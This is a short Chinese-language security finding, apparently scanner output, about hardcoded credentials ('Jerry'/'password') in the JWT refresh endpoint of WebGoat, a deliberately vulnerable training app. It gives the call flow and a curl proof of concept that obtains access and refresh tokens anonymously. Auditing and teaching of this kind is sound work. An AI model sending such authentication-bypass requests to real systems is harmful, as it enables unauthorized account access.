### [1] CWE-287 — `jwtep_354`
> JWT 刷新端点 /JWT/refresh/login 存在硬编码凭据（'Jerry'/'password'）且使用明文 equals 比较，导致认证绕过；无任何前置鉴权（未被 SecurityFilterChain permitAll 覆盖，但亦未受 authenticated 保护），可被匿名调用。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
HTTP POST /JWT/refresh/login → JWTRefreshEndpoint.follow(Map) [org/owasp/webgoat/lessons/jwt/JWTRefreshEndpoint.java:49] → direct string comparison against hardcoded PASSWORD → createNewTokens(user) → returns new JWT tokens

#### 漏洞利用（PoC）
curl -X POST '{BASE_URL}/JWT/refresh/login' \
  -H 'Content-Type: application/json' \
  -d '{"user":"Jerry","password":"password"}'

预期响应：HTTP 200 OK，返回包含 access_token 和 refresh_token 的 JSON 对象（如 {"access_token":"eyJ...","refresh_token":"eyJ..."}）。该请求无需任何 Cookie 或 Authorization header，可在未登录状态下直接执行。
